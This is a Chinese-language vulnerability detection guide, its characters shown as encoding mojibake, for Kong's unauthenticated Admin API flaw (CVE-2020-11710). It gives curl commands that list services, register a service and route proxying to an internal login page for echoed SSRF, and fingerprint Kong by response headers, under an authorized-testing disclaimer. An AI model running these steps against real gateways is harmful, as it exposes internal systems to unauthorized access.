### å£°æ˜

æ­¤å¤„æä¾›çš„æ¼æ´æ£€æµ‹æ–¹æ³•ã€æ–‡ä»¶ç­‰å†…å®¹ï¼Œå‡ä»…é™äºå®‰å…¨ä»ä¸šè€…åœ¨è·å¾—æ³•å¾‹æˆæƒçš„æƒ…å†µä¸‹ä½¿ç”¨ï¼Œç›®çš„æ˜¯æ£€æµ‹å·²æˆæƒçš„æœåŠ¡å™¨çš„å®‰å…¨æ€§ã€‚å®‰å…¨ä»ä¸šè€…åŠ¡å¿…éµå®ˆæ³•å¾‹è§„å®šï¼Œç¦æ­¢åœ¨æ²¡æœ‰å¾—åˆ°æˆæƒçš„æƒ…å†µä¸‹åšä»»ä½•æ¼æ´æ£€æµ‹ã€‚

### ç®€ä»‹

Kongæœªæˆæƒè®¿é—®æ¼æ´(CVE-2020-11710)çš„æ£€æµ‹è¿‡ç¨‹

#### æ£€æµ‹æ–¹æ³•1

```
# æŸ¥çœ‹
# æ³¨æ„ æˆ‘çš„<admin-hostname>æ˜¯127.0.0.1 éœ€æ›¿æ¢<admin-hostname>

# æ£€æµ‹æ¼æ´ - ä¿¡æ¯æ³„éœ²
# åˆ©ç”¨ Admin Restful API - æŸ¥çœ‹å½“å‰Kong Gatewayå·²æœ‰çš„"æœåŠ¡"(web API)
curl -i -X GET http://127.0.0.1:8001/services

# æ£€æµ‹æ¼æ´ - SSRF
# åˆ©ç”¨ Admin Restful API - åœ¨Kong Gatewayä¸Šæ³¨å†Œä¸€ä¸ªæ–°çš„"æœåŠ¡"(web API) æŒ‡å‘å†…ç½‘çš„æ•æ„Ÿç«™ç‚¹ http://10.11.11.2:8888/login
# æ³¨æ„ name å¿…é¡»å”¯ä¸€

curl -i -X POST http://127.0.0.1:8001/services \
 --data name=target \
 --data url='http://10.11.11.2:8888/login'


# (è¯¥æ­¥éª¤å¯çœç•¥) éªŒè¯è¿™ä¸ª(åä¸ºtargetçš„)æœåŠ¡çš„endpointæ˜¯å¦æ³¨å†ŒæˆåŠŸ
# curl -i http://127.0.0.1:8001/services/target


# æ·»åŠ ä¸€ä¸ªRoute
# paths[]çš„å€¼ä¸º /site1
# nameçš„å€¼ä¸º 111111  nameçš„å€¼ä¸é‡è¦

curl -i -X POST http://127.0.0.1:8001/services/target/routes \
  --data 'paths[]=/site1' \
  --data 'name=111111'


# ä½¿ç”¨ æ­£å¸¸å¼€æ”¾çš„(HTTP Proxy Port)8000è®¿é—®/site1
# å¯éªŒè¯è¿™ä¸ªRouteæ˜¯å¦æ­£åœ¨è½¬å‘è¯·æ±‚åˆ°å¯¹åº”"æœåŠ¡" å³http://10.11.11.2:8888/login
# ğŸ”¥SSRF å¯å›æ˜¾
curl -i -X GET http://127.0.0.1:8000/site1


# ä½¿ç”¨ æ­£å¸¸å¼€æ”¾çš„(HTTPS Proxy Port) 8443 è®¿é—®/site1  å½“ç„¶ä¹Ÿå¯ä»¥
# ä½¿ç”¨curlçš„ --insecure é€‰é¡¹ æ¥å¿½ç•¥SSLè¯ä¹¦éªŒè¯ disables certificate validation
# ğŸ”¥SSRF å¯å›æ˜¾
curl -i -X GET https://127.0.0.1:8443/site1 --insecure


# (æ£€æµ‹è¿‡ç¨‹æ— éœ€è¯¥æ­¥éª¤) å¯æŸ¥çœ‹æœ¬æ¬¡è¯·æ±‚çš„Headerç­‰ä¿¡æ¯
# curl -i -X GET http://127.0.0.1:8000/site1/request
```

#### æ£€æµ‹æ–¹æ³•2


å‘èµ·è¯·æ±‚ï¼Œè®¿é—®é»˜è®¤çš„Admin Restful APIç«¯å£ 8001 å’Œ 8444
```
curl -i -X GET http://127.0.0.1:8001/
curl -i -X GET https://127.0.0.1:8444/ --insecure

# ä¹Ÿå¯ä»¥è®¿é—®Kongè‡ªå¸¦çš„å…¶ä»–è·¯å¾„ /statusç­‰
```

å¾—åˆ°Response


Response Headerä¸­æœ‰2ä¸ªç‰¹å¾:
```
Server: kong
X-Kong-Admin-Latency:
```

Response Bodyä¸­ä¹Ÿæœ‰ç‰¹å¾:

response bodyä¸ºjsonæ ¼å¼ï¼Œä¸”å…¶ä¸­æœ‰5ä¸ª`X-Kong`å¼€å¤´çš„å­—æ®µ
```
"X-Kong-Response-Latency"
"X-Kong-Admin-Latency"
"X-Kong-Upstream-Status"
"X-Kong-Proxy-Latency"
"X-Kong-Upstream-Latency"
```

å¦‚æœç‰¹å¾å­˜åœ¨ï¼Œåˆ™è¯´æ˜Admin Restful API å¯è¢«è®¿é—®ï¼Œæ¼æ´å­˜åœ¨ã€‚
